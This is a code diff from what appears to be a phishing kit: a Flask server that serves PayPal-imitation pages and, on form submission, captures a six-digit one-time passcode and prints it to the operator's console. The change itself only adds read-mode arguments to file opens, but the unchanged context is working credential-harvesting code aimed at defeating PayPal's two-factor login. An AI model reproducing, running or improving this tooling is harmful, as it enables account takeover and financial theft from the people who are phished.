@@ -26,12 +26,12 @@ def server():
         if request.method == "POST":
             print(Fore.RED + "[!] " + Fore.GREEN + " Code otp: " + request.form["otpCode-0"] + "-" + request.form["otpCode-1"] + "-" + request.form["otpCode-2"] + "-" + request.form["otpCode-3"] + "-" + request.form["otpCode-4"] + "-" + request.form["otpCode-5"])
 
-            return open("menu/site/siteTemplate/paypal/templates/load.html")
-        return open("menu/site/siteTemplate/paypal/templates/getCode.html")
+            return open("menu/site/siteTemplate/paypal/templates/load.html", "r")
+        return open("menu/site/siteTemplate/paypal/templates/getCode.html", "r")
 
     @app.route("/authflow", methods=["GET", "POST"])
     def authflow():
-        return open("menu/site/siteTemplate/paypal/templates/authflow.html")
+        return open("menu/site/siteTemplate/paypal/templates/authflow.html", "r")
 
     @app.route("/", methods=["GET", "POST"])
     def index():
@@ -51,7 +51,7 @@ def server():
                 print(Fore.GREEN + "[*] " + Fore.RESET + " Redirect...")
                 return redirect("/authflow")
             else:
-                return open("menu/site/siteTemplate/paypal/templates/load.html")
+                return open("menu/site/siteTemplate/paypal/templates/load.html", "r")
         return open("menu/site/siteTemplate/paypal/templates/index.html", "r")
 
     with open("./settings/settings.json", "r") as f:
